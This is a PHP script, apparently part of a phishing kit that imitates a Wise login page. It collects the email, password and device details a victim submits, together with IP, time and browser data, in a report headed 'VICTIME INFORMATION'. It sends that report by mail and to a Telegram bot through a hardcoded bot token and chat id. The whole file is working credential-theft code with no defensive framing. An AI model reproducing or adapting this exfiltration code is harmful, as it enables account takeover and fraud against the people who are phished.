<?php

include('get_browser.php');
include('get_ip.php');
include('Email.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	
	
if ($_POST['device'] == "" || $_POST['email_auth'] == "" || $_POST['pass_auth'] == "") {
  
  

$data['statut'] = 'error'; 
$data['title'] = 'echec';
$data['resultat']="aucune donnée saissir ";
  
  }else{
$Domin = $_SESSION['Domin'] = $_SERVER['HTTP_REFERER']; 
$rt = substr($Domin, 0, -9);
$rtt = ''.$Domin.'/Select/Select.html' ; 
$DCH_MESSAGE .= "
+=======VICTIME INFORMATION========+

| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+==========LOGIN WISE========+
| DEVICE USER AGENT      =  ".$_POST['device']."
| EMAIL      =  ".$_POST['email_auth']."
| MOT DE PASSE     =  ".$_POST['pass_auth']."
| LIEN PANEL              =  ".$rtt."
+===============================+\n";

$DCH_SUBJECT .= "LOGIN WISE";
$DCH_HEADERS .= "From: TCHE-Dev<cantact>";
$DCH_HEADERS .= "TCHE-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
file_get_contents("https://api.telegram.org/bot1539011587:AAGFkY-cBX19F-e876ZNmFU7Alrg6pb9QfQ/sendMessage?chat_id=1413487295&text=".urlencode($DCH_MESSAGE)."" );

$Page .= ' ';

$fPage = fopen("../Select/Show_system/Show_Page.txt", "w");

fwrite($fPage, $Page);


$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


